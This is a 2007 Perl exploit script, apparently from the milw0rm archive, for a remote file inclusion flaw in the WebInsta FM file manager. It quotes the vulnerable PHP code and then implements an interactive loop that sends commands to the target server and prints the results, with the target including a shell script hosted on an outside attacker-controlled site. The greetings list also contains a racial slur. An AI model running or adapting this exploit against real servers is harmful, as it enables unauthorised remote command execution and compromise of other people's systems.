#!/usr/bin/perl
##############################################################################################
#         ___   ___                         _
#        / _ \ / _ \                       | |
#   __ _| | | | | | |_ __  ___   _ __   ___| |_
#  / _` | | | | | | | '_ \/ __| | '_ \ / _ \ __|
# | (_| | |_| | |_| | | | \__ \_| | | |  __/ |_
#  \__, |\___/ \___/|_| |_|___(_)_| |_|\___|\__|
#   __/ |
#  |___/
##############################################################################################
#INFO:
#Program Title ###############################################################################
#WebInsta FM <= 0.1.4 Remote File Inclusion Vulnerability
#
#Description #################################################################################
#This is a basic file manager written by WebInsta.com
#
#Vuln Code ###################################################################################
#In /admin/login.php:
#   if(isset($_COOKIE['adminname']) && isset($_COOKIE['adminpass'])){
#      $cusername = $_COOKIE['adminname'];
#      $cpassword = $_COOKIE['adminpass'];
#	  include($absolute_path."admin/checkpass.php");
#	  }
#Note: Register globals must be ON, and Magic Quotes must be OFF for this exploit to work.
#
#Script Download ##############################################################################
#http://webinsta.com/cgi-bin/axs/ax.pl?http://www.webinsta.com/downloads/webinstafm.zip
#
#Original Advisory ############################################################################
#http://g00ns-forum.net/showthread.php?t=8643
#
#Exploit #######################################################################################
#
#[c]ode by TrinTiTTY (2007) www.g00ns.net
#credz to MurderSkillz and FiSh for vulnerability
#shoutz: clorox, z3r0, katalyst, SyNiCaL, Nigger, OD, pr0be, 0ptix, rezen [at] rezen.org, str0ke
#        grumpy, and everyone else at g00ns.net
###############################################################################################
use IO::Socket;

$host = @ARGV[0];
$path = @ARGV[1];
$shell = @ARGV[2];

if (@ARGV != 3){header();usage();exit();}
header();
print "\n [!] Type 'quit' to exit\n";
xpl();
sub xpl(){
	while (){
		print "\nshell\@box\$ ";
		$command = <STDIN>;
		chomp($command);
		if ($command =~ /quit/i){exit();}

		$sock = IO::Socket::INET->new(PeerAddr => "$host",PeerPort => "80",Proto => "tcp") || die "Can't establish a connection\n";
		print $sock "GET $path/admin/login.php?absolute_path=$shell?&cmd=$command HTTP/1.1\n";
		print $sock "Host: ".$host."\n";
		print $sock "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.6) Gecko/20060728 Firefox/1.5.0.6\n";
		print $sock "Accept: */*\n";
		print $sock "Accept-Language: en-us,en;q=0.5\n";
		print $sock "Accept -Encoding: gzip , deflate\n";
		print $sock "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n";
		print $sock "Keep-Alive: 300\n";
		print $sock "Connection: keep-alive\n";
		print $sock "Referer: $host\n";
		print $sock "Cookie: adminname=c84ejd9;adminpass=s3lm5;PHPSESSID=032b155cf082c0f28009ec65ee7986f1\n\n";
		while ($ans = <$sock>){
			if ($ans =~ /<b>Warning<\/b>:(.*?)/gmi)
			{print "\n [-] Bad site, command, or shell\n";xpl()}
			if ($ans =~ /<html>(.*)/i){xpl()}
			print $ans;
		}}}
sub header(){
	print q{
		|======================================================|
		|                  WebInsta FM (RFI)                   |
		|         [c]oded by TrinTiTTy [at] g00ns.net          |
		| -----------------------------------------------------|
		|                                                      |
		|        Vulnerability by MurderSkillz and FiSh        |
		|             greetz: 13337.org, rezen.org str0ke      |
		|                                                      |
		|                   www.g00ns.net                      |
		|======================================================|
	}}
sub usage()
{
	print "\n Usage: perl $0 <host> <dir> <shell>";
	print "\n Example: perl $0 www.victim.com /pathtofm http://www.othersite.com/shell.txt\n\n";
}

# milw0rm.com [2007-04-23]